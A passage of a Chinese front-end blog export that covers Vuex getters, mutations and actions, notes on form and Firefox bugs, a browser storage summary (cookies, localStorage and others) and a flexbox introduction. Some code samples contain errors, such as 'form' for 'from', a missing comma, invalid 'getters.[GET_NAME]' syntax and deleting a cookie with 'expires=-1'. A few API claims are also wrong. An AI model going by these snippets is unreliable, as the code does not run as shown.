<p>getter接受 <code>state</code> 作为其<strong>第一个参数</strong>，接受 <code>getters</code> 作为其<strong>第二参数</strong>，对于模块内部的getter来说，接受<code>rootState</code>作为<strong>第三个参数</strong>，为根节点的state。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        name: <span class="string">"tom"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        money: <span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        getAge(state) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.age / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        convert(state, getters, rootState) =&gt; &#123;</span><br><span class="line">            <span class="comment">// 第二个参数getters返回该store.getters对象</span></span><br><span class="line">            <span class="keyword">return</span> state.money * <span class="number">100</span> * getters.getAge;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getter也可以返回函数，以达到传参的目的</span></span><br><span class="line">        <span class="comment">// 1:人民币转美元  0:反之</span></span><br><span class="line">        convertByRate: <span class="function">(<span class="params">state</span>) =&gt;</span> <span class="function">(<span class="params">type</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> rate = type === <span class="number">1</span> ? <span class="number">6.8925</span> : <span class="number">0.1451</span>;</span><br><span class="line">            <span class="keyword">return</span> state.money * rate;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getter传参</span></span><br><span class="line"><span class="comment">// 转美元</span></span><br><span class="line"><span class="keyword">this</span>.$store.getters.convertByRate(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<h3 id="mapGetters"><a href="#mapGetters" class="headerlink" title="mapGetters"></a>mapGetters</h3><p>用法和mapState相同，将 store 中的 getter 映射到局部计算属性</p>
<p>mapGetters中方法接受一个参数：context对象，等同于store实例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组件中：</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapGetters &#125; <span class="keyword">from</span> <span class="string">"vuex"</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">computed: ...mapGetters(&#123;</span><br><span class="line">    convert: <span class="function"><span class="params">context</span> =&gt;</span> context.getters.convert</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// computed: ...mapGetters([</span></span><br><span class="line"><span class="comment">//     "convert"</span></span><br><span class="line"><span class="comment">// ]);</span></span><br></pre></td></tr></table></figure>
<h2 id="Mutations-同步事务"><a href="#Mutations-同步事务" class="headerlink" title="Mutations 同步事务"></a>Mutations 同步事务</h2><p>Vuex中，在组件中直接改变state的值是不行的，<strong>唯一</strong>改变状态的方法是提交 <strong>mutation</strong> 。每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)，这是官方的说法，我觉得其实就是事件名和事件本体啦，这样更好理解。<strong>事件第一个参数是state，第二个参数是载荷（payload），可选，一般情况下是一个对象。</strong>（载荷payload这个名字也是很有逼格，redux中也是这样叫的，vuex参考了redux）</p>
<p>还是之前的例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        name: <span class="string">"tom"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        money: <span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        getAge(state) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.age / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        setName(state, payload) &#123;</span><br><span class="line">            state.name = payload.name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 或者简单点，不传对象直接传值</span></span><br><span class="line">        <span class="comment">// setName(state, val) &#123;</span></span><br><span class="line">        <span class="comment">//     state.name = val;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>那么怎么调用这个mutation来改变state的值呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.commit(<span class="string">"setName"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象的形式调用</span></span><br><span class="line"><span class="keyword">this</span>.$store.commit(&#123;</span><br><span class="line">    type: <span class="string">"setName"</span>,</span><br><span class="line">    name: <span class="string">"rachael"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="mapMutations"><a href="#mapMutations" class="headerlink" title="mapMutations"></a>mapMutations</h3><p>同mapState 与 mapGetters用法，我们将mutation的方法映射到本地组件中；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapMutations &#125; form <span class="string">"vuex"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">        ...mapMutations([</span><br><span class="line">            <span class="comment">// 将this.setName(payload) 映射为 this.$store.commit("setName", payload)</span></span><br><span class="line">            <span class="string">"setName"</span></span><br><span class="line">        ])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在mutations中只支持同步事件，需要处理一些http请求等异步事件时就需要actions了</p>
<h2 id="Actions-异步事务"><a href="#Actions-异步事务" class="headerlink" title="Actions 异步事务"></a>Actions 异步事务</h2><p>在action中，不是直接改变状态的值，而是提交mutation来改变。action中可以包含任意的异步操作。</p>
<p>还是之前的例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        name: <span class="string">"tom"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        money: <span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        getAge(state) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.age / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        setName(state, payload) &#123;</span><br><span class="line">            state.name = payload.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;</span><br><span class="line">        setName(context) &#123;</span><br><span class="line">            <span class="comment">// context参数与 store 实例具有相同方法和属性，当不等同于store实例，其还有rootState属性，即根节点state</span></span><br><span class="line">            setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                context.commit(<span class="string">"setName"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br><span class="line">            &#125;, <span class="number">1000</span>)</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参数解构简写</span></span><br><span class="line">        <span class="comment">// setName(&#123; commit, rootState &#125;) &#123;</span></span><br><span class="line">        <span class="comment">//     rootState为该模块根节点state值</span></span><br><span class="line">        <span class="comment">//     commit("setName", &#123; name: "rachael" &#125;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="调用action"><a href="#调用action" class="headerlink" title="调用action"></a>调用action</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.dispatch(<span class="string">'setName'</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>同样也有mapActions函数，用法和mapMutations相同；</p>
<p>当一个action函数需要调用其他异步的action1时，将action1返回一个Promise并结合<code>async / await</code>调用即可。</p>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>默认情况下，模块内部的 <strong>action、mutation 和 getter 是注册在全局命名空间</strong>的。在调用时，直接全局调用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.getters.getAge();</span><br><span class="line"><span class="keyword">this</span>.$store.commit(<span class="string">"setName"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br><span class="line"><span class="keyword">this</span>.$store.dispatch(<span class="string">"setName"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>注册为模块命名空间的就不讨论了，一般用默认的全局就可以了，模块命名空间会麻烦很多。</p>
<h2 id="常量表示"><a href="#常量表示" class="headerlink" title="常量表示"></a>常量表示</h2><p>使用常量代替方法名，再把这些常量放在统一的一个文件：types.js中，有助于我们维护和理解。</p>
<p>types.js:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SET_NAME = <span class="string">"SET_NAME"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> GET_NAME = <span class="string">"GET_NAME"</span>;</span><br></pre></td></tr></table></figure>
<p>在module.js中就可以改为：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    SET_NAME,</span><br><span class="line">    GET_NAME</span><br><span class="line">&#125; form <span class="string">"@/store/types"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        name: <span class="string">"tom"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        money: <span class="number">100</span></span><br><span class="line">    &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        [GET_NAME](state) &#123;</span><br><span class="line">            <span class="keyword">return</span> state.age / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        [SET_NAME](state, payload) &#123;</span><br><span class="line">            state.name = payload.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;</span><br><span class="line">        [GET_NAME](&#123; commit, rootState &#125;) &#123;</span><br><span class="line">            <span class="comment">// context参数与 store 实例具有相同方法和属性，当不等同于store实例，其还有rootState属性，即根节点state</span></span><br><span class="line">            setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                commit(<span class="string">"setName"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br><span class="line">            &#125;, <span class="number">1000</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.getters.[GET_NAME]();</span><br><span class="line"><span class="keyword">this</span>.$store.commit(<span class="string">"SET_NAME"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br><span class="line"><span class="keyword">this</span>.$store.dispatch(<span class="string">"SET_NAME"</span>, &#123; <span class="attr">name</span>: <span class="string">"rachael"</span> &#125;);</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>再回到这张图，是不是就好理解了～</p>
<p><img src="https://static.simmzl.cn/img/vuex.png" alt="vuex"></p>
<p><img src="https://static.simmzl.cn/img/store.png" alt="store"></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>bugs</title>
    <url>/2019/03/bugs.html</url>
    <content><![CDATA[<p>用心写的bug…当然要好好记录下来…</p>
<a id="more"></a>
<h2 id="html-css-js相关"><a href="#html-css-js相关" class="headerlink" title="html/css/js相关"></a>html/css/js相关</h2><h3 id="使用vue-element做表单，enter回车时触发页面刷新"><a href="#使用vue-element做表单，enter回车时触发页面刷新" class="headerlink" title="使用vue + element做表单，enter回车时触发页面刷新"></a>使用vue + element做表单，enter回车时触发页面刷新</h3><p>D(description)</p>
<p>当给input框加<code>@keyup.enter.native</code>回调事件时仍触发页面刷新。</p>
<p>R(reason)</p>
<p>其实这和vue/element没关系，当页面的form表单里只有一个input输入框时，回车会submit提交表单操作，这是一个默认事件。</p>
<p>F(fix)</p>
<ul>
<li>在el-form上添加 <code>@submit.native.prevent</code> 阻止默认行为，native用于绑定原生dom</li>
<li>原生html就在submit事件中event.preventDefault()，与上同理</li>
</ul>
<h2 id="浏览器兼容相关"><a href="#浏览器兼容相关" class="headerlink" title="浏览器兼容相关"></a>浏览器兼容相关</h2><h3 id="input在firefox下边框变红"><a href="#input在firefox下边框变红" class="headerlink" title="input在firefox下边框变红"></a>input在firefox下边框变红</h3><p>R</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;number&quot; min=&quot;1&quot; max=&quot;0&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>input 的min 与 max值冲突了，ff下会默认加红色的box-shadow；</p>
<p>F</p>
<ul>
<li>改max min 值</li>
<li>box-shadow：none</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>css</tag>
        <tag>bug</tag>
        <tag>html</tag>
        <tag>vue</tag>
        <tag>elementUI</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年</title>
    <url>/2022/08/2021%E5%B9%B4.html</url>
    <content><![CDATA[<p>😷</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1451856375&auto=0&height=66"></iframe>

<a id="more"></a>
<p>疫情什么时候彻底结束？</p>
]]></content>
      <categories>
        <category>影像月历</category>
      </categories>
  </entry>
  <entry>
    <title>cookie/localStroage/sessionStroage/indexDB/webSQL简略总结</title>
    <url>/2018/08/cookie-localStroage-sessionStroage-indexDB-webSQL%E7%AE%80%E7%95%A5%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<p>日常开发用到最多的是localStroage,其次是cookie,但浏览器存储还包括sessionStroage、indexDB和webSQL，做一下简略总结。</p>
<a id="more"></a>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>大小限制4k;</p>
<h2 id="服务器创建"><a href="#服务器创建" class="headerlink" title="服务器创建"></a>服务器创建</h2><p>当服务器收到HTTP请求时，服务器可在响应头里添加<code>Set-Cookie</code>选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发给服务器。<br>响应报文：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>
<p>之后发送的请求报文：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy<span class="emphasis">_cookie=choco; tasty_</span>cookie=strawberry</span><br></pre></td></tr></table></figure>
<h2 id="浏览器创建"><a href="#浏览器创建" class="headerlink" title="浏览器创建"></a>浏览器创建</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"key=value[; expires=date][; domain=domain][; path=path][; secure][; HttpOnly]"</span></span><br></pre></td></tr></table></figure>
<h3 id="键值对"><a href="#键值对" class="headerlink" title="键值对"></a>键值对</h3><p>多个赋值时，最好分开：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"key=value"</span>;</span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"key1=value1"</span>;</span><br></pre></td></tr></table></figure>
<p>网上很多使用分号加空格的，并不能多个赋值。</p>
<h3 id="expires"><a href="#expires" class="headerlink" title="expires"></a>expires</h3><p>有效期，不设置会 <strong>在浏览器关闭之后被自动删除</strong>；</p>
<p>设置格式为GMT时间格式。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> t = <span class="keyword">new</span> <span class="built_in">Date</span>( <span class="built_in">Date</span>.now() + <span class="number">1000</span> * <span class="number">120</span> );</span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`name=monsterooo;expires=<span class="subst">$&#123;t.toGMTString()&#125;</span>;`</span>;</span><br></pre></td></tr></table></figure>
<h3 id="作用域-Domain-amp-Path"><a href="#作用域-Domain-amp-Path" class="headerlink" title="作用域 Domain &amp; Path"></a>作用域 Domain &amp; Path</h3><p>Domain 标识指定了哪些host可以接受Cookie。设置<code>Domain=.simmzl.cn</code>后，子域名可以接受这些host Cookie；</p>
<p>Path 标识指定了host下的哪些路径可以接受Cookie,</p>
<p>例如，设置<code>Path=/docs</code>，则以下地址都会匹配：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">/docs</span><br><span class="line">/docs/Web/</span><br><span class="line">/docs/Web/HTTP</span><br></pre></td></tr></table></figure>
<h3 id="安全-secure-amp-HttpOnly"><a href="#安全-secure-amp-HttpOnly" class="headerlink" title="安全 secure &amp; HttpOnly"></a>安全 secure &amp; HttpOnly</h3><p>标记为 <code>Secure</code> 的<code>Cookie</code>只应通过被HTTPS协议加密过的请求发送给服务端。</p>
<p>为避免跨域脚本(XSS)攻击，通过JavaScript的<code>Document.cookie API</code>无法访问带有 <code>HttpOnly</code> 标记的<code>Cookie</code>，它们只应该发送给服务端。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
<p>关于<a href="https://blog.simmzl.cn/2017/11/11%E6%9C%88%E7%AC%94%E8%AF%95%E9%A2%98&amp;%E9%9D%A2%E8%AF%95.html">XSS和CSRF</a></p>
<h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> getCookie = <span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">";"</span>);</span><br><span class="line">    <span class="keyword">const</span> len = cookies.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// 去掉头部空格</span></span><br><span class="line">        <span class="keyword">const</span> keyVal = cookies[i].trim().split(<span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span> (keyVal[<span class="number">0</span>] === key) <span class="keyword">return</span> keyVal[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="修改-amp-删除cookie"><a href="#修改-amp-删除cookie" class="headerlink" title="修改&amp;删除cookie"></a>修改&amp;删除cookie</h2><p>修改即重新赋值；</p>
<p>删除就是将该<code>key</code>设为空，<code>expires</code>设为过去的时间，正常设为 <code>-1</code>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"key=; expires=-1"</span>;</span><br></pre></td></tr></table></figure>
<h1 id="localStroage"><a href="#localStroage" class="headerlink" title="localStroage"></a>localStroage</h1><ul>
<li><p><code>HTML5</code>新加入</p>
</li>
<li><p>仅限于该页面的协议</p>
</li>
<li><p>一般浏览器支持的是5M大小</p>
</li>
<li><p>所有的浏览器中都会把<code>localStorage</code>的<code>value</code>定为<code>string</code>类型，需要使用<code>JSON.parse()</code>、<code>JSON.stringify()</code>转换。</p>
</li>
<li><p>localStorage在浏览器的隐私模式下面是不可读取的</p>
</li>
<li><p>localStorage本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡</p>
</li>
<li><p>localStorage不能被爬虫抓取到</p>
</li>
<li><p>localStroage不能设置过期时间，会一直存在。但是可以手动设置过期时间，下次读取时判断是否过期，只当没过期才读取</p>
</li>
</ul>
<h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">localStorage[<span class="string">"a"</span>] = <span class="number">1</span>;</span><br><span class="line">localStorage.a = <span class="number">1</span>;</span><br><span class="line">localStorage.setItem(<span class="string">"a"</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>完善版本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cacheSet = <span class="function">(<span class="params">key, value, expire</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> win = <span class="built_in">window</span>;</span><br><span class="line">    <span class="keyword">if</span> (!win.JSON || !win.JSON.parse) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> expireMils = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (expire) expireMils = <span class="built_in">Date</span>.now() + expire;</span><br><span class="line">    <span class="keyword">const</span> data = &#123;</span><br><span class="line">        value: value,</span><br><span class="line">        expire: expireMils</span><br><span class="line">    &#125;;</span><br><span class="line">    localStorage[key] = <span class="built_in">JSON</span>.stringify(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">localStorage[<span class="string">"a"</span>];</span><br><span class="line">localStorage.a;</span><br><span class="line">localStorage.getItem(<span class="string">"a"</span>);</span><br></pre></td></tr></table></figure>
<p>完善版本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cacheGet = <span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> win = <span class="built_in">window</span>;</span><br><span class="line">    <span class="keyword">if</span> (!win.JSON || !win.JSON.parse) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// JSON.parse(undefined)会报错</span></span><br><span class="line">        data = <span class="built_in">JSON</span>.parse(localStorage[key]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有设置有效期</span></span><br><span class="line">    <span class="keyword">if</span> (data.expire === <span class="number">-1</span>) <span class="keyword">return</span> data.value;</span><br><span class="line">    <span class="comment">// 有效期内</span></span><br><span class="line">    <span class="keyword">if</span> (data.expire &gt; <span class="built_in">Date</span>.now()) <span class="keyword">return</span> data.value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>删除单个：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">localStorage.removeItem(<span class="string">"a"</span>);</span><br></pre></td></tr></table></figure>
<p>删除所有：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">localStorage.clear();</span><br></pre></td></tr></table></figure>
<h1 id="sessionStroage"><a href="#sessionStroage" class="headerlink" title="sessionStroage"></a>sessionStroage</h1><p>增删查改和特性与 <code>localStorage</code> 相同,但在新标签或窗口打开一个页面会初始化一个新的会话，浏览器关闭会被清除。</p>
<h1 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h1><p>IndexedDB 用于客户端存储大量结构化数据(包括文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。<br>但是，实际开发用indexDB场景不多。</p>
<h1 id="web-SQL"><a href="#web-SQL" class="headerlink" title="web SQL"></a>web SQL</h1><p>Web SQL 数据库 API 并不是 HTML5 规范的一部分，但是它是一个独立的规范，引入了一组使用 SQL 操作客户端数据库的 APIs。</p>
<p>如果你是一个 Web 后端程序员，应该很容易理解 SQL 的操作。要用到SQL语句，差不多就是基于浏览器的SQL,实际开发应用场景不多。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/monsterooo/p/6815392.html" target="_blank" rel="noopener">浏览器存储(cookie、localStorage、sessionStorage)</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API" target="_blank" rel="noopener">Web Storage API</a><br><a href="https://www.cnblogs.com/st-leslie/p/5617130.html" target="_blank" rel="noopener">localStorage使用总结</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>flex布局</title>
    <url>/2017/08/flex%E5%B8%83%E5%B1%80.html</url>
    <content><![CDATA[<p>Flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。<br>任何一个容器都可以指定为Flex布局。</p>
<p>学习flex推荐使用<a href="http://flexboxfroggy.com" target="_blank" rel="noopener">flexbox froggy</a>，一个学习CSS flexbox布局的小游戏,事半功倍！</p>
<p><img src="http://static.simmzl.cn/blog/170929/H8HBJ4i9je.png" alt="FLOG"></p>
<p>苟利…<br><a id="more"></a></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>行内元素也可以使用Flex布局。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Webkit内核的浏览器，必须加上-webkit前缀。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:-webkit-flex;<span class="comment">/* Safari */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。</p>
<h2 id="主要的6个属性："><a href="#主要的6个属性：" class="headerlink" title="主要的6个属性："></a>主要的6个属性：</h2><ul>
<li>flex-direction - 确定主轴方向</li>
<li>flex-wrap - 定义怎么换行</li>
<li>flex-flow - 上面两个属性的简写</li>
<li>justify-content - 主轴对齐方式</li>
<li>align-items - 主轴垂直方向对齐方式</li>
<li>align-content - 多根轴线怎么对齐方式</li>
</ul>
<h3 id="flex-direction属性决定主轴的方向（即项目的排列方向）。"><a href="#flex-direction属性决定主轴的方向（即项目的排列方向）。" class="headerlink" title="flex-direction属性决定主轴的方向（即项目的排列方向）。"></a>flex-direction属性决定主轴的方向（即项目的排列方向）。</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。"><a href="#默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。" class="headerlink" title="默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。"></a>默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row-nowrap。"><a href="#flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row-nowrap。" class="headerlink" title="flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。"></a>flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>:&lt;flex-direction&gt;||&lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="justify-content属性定义了项目在主轴上的对齐方式。"><a href="#justify-content属性定义了项目在主轴上的对齐方式。" class="headerlink" title="justify-content属性定义了项目在主轴上的对齐方式。"></a>justify-content属性定义了项目在主轴上的对齐方式。</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-start | flex-end| center | space-between | space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
